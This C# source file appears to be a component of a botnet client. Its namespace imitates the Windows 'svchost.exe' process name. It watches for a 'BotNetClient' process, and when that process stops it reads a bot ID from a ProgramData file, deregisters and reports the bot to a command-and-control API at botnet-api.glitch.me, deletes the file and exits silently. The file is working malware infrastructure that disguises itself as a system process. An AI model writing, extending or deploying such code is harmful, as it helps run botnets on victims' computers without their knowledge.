using System.Linq;
using System.Diagnostics;
using System.IO;
using System;
using System.Net.Http;
using System.Net;
using System.Threading.Tasks;
using System.Threading;
using System.Web.Script.Serialization;

namespace svchost.exe
{
    public class Response
    {
        public uint id { get; set; }
        public string response { get; set; }
    }
    class Program
    {
        static async Task<HttpResponseMessage> SendAsync(string Id)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
            Response response = new Response
            {
                id = Convert.ToUInt32(Id),
                response = "id: " + Id + "    Disconnected"
            };
            string json = new JavaScriptSerializer().Serialize(response);
            HttpResponseMessage response2 = await client.PostAsync($"/api/v1/responses/{Id}", new StringContent(json));
            return response2;
        }
        static async Task<HttpResponseMessage> Delete(uint id)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
            HttpResponseMessage res = await client.DeleteAsync($"/api/v1/client/{id}");
            return res;
        }
        static void Main(string[] args)
        {
            try
            {
                ServicePointManager.Expect100Continue = false;
                String pth = "System.Diagnostics.Process (BotNetClient)";
                Thread.Sleep(1000);
                string id;
                var process = Process.GetProcessesByName("BotNetClient");
                while (true)
                {
                    if (process[0].ToString()== pth)
                    {
                        process = Process.GetProcessesByName("BotNetClient");
                    }
                    else
                    {
                        id = File.ReadAllText("C:\\ProgramData\\idbtc.txt");
                        var resd = Delete(Convert.ToUInt32(id)).Result;
                        Thread.Sleep(1000);
                        var res = SendAsync(id).Result;
                        File.Delete("C:\\ProgramData\\idbtc.txt");
                        throw new Exception();
                    }
                }
            }
            catch (Exception)
            {
                Environment.Exit(0);
            }
        }
    }
}
